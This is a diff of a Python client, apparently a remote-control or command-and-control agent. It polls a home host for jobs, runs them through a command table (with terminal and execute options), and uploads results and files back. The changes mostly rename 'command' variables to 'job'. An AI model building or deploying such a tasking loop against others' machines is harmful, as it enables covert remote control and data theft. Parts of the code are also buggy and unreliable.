@@ -105,7 +105,7 @@ class Client:
         status_message = get_status.json()['message']
         self.client_id = get_status.json()['client_id']
         self.home_host = f'{HOME_HOST}{self.client_id}/'
-        self.home_host_files = f'{HOME_HOST}{self.client_id}/upload'
+        self.home_host_files = f'{HOME_HOST}{self.client_id}/upload/'
         status_code = get_status.status_code
         print(self.client_id)
         print(self.home_host)
@@ -266,8 +266,8 @@ def main():
 
     connect_or_kill(4)
     command = Command()
-    received_com_id = []
-    sent_com_id = []
+    received_job_id = []
+    sent_job_id = []
 
     com_dict = {
         'popup': command.popup,
@@ -281,32 +281,30 @@ def main():
 
     while True:
         print('++++ NEW ITERATION, PRINTING LISTS ++++')
-        print(f'Received commands (basing on command_id\'s): {received_com_id}')
-        print(f'Sent commands (basing on command_id\'s): {sent_com_id}')
-        # List of available commands
-        # 'None' can flip whole script! (None as command params)
+        print(f'Received jobs (basing on job_id\'s): {received_job_id}')
+        print(f'Sent jobs (basing on job_id\'s): {sent_job_id}')
         get_job = client.get_data()
         #print(get_job)
-        com = get_job.get('command')
+        job = get_job.get('job')
         # convert string to bool if key is 'terminal' or 'execute'
-        com_args = {k: literal_eval(v) if ('terminal' or 'execute') in k else v
-                    for k, v in literal_eval(get_job.get('command_args')).items()}
-        #print(com_args)
-        com_id = get_job['command_id']
-        if any(i in com for i in com_dict):
-            if com_id not in (received_com_id and sent_com_id):
+        job_args = {k: literal_eval(v) if ('terminal' or 'execute') in k else v
+                    for k, v in literal_eval(get_job.get('job_args')).items()}
+        #print(job_args)
+        job_id = get_job['job_id']
+        if any(i in job for i in com_dict):
+            if job_id not in (received_job_id and sent_job_id):
                 # Do something
-                com_to_run = com_dict[com]
-                if com_args:
-                    com_result = com_to_run(**com_args)
+                com_to_run = com_dict[job]
+                if job_args:
+                    job_result = com_to_run(**job_args)
                 else:
-                    com_result = com_to_run()
-                received_com_id.append(com_id)
+                    job_result = com_to_run()
+                received_job_id.append(job_id)
                 job_results = {
-                    'command_result': '[{}] {}'.format(com_id, com_result.get('confirmation')),
+                    'job_result': '[{}] {}'.format(job_id, job_result.get('confirmation')),
                 }
-                client.send_data(job_results, com_result.get('file', None))
-                sent_com_id.append(com_id)
+                client.send_data(job_results, job_result.get('file', None))
+                sent_job_id.append(job_id)
             else:
                 job_results = {
                     'last_activity_datetime': strftime('%Y-%m-%d %H:%M:%S', gmtime()),
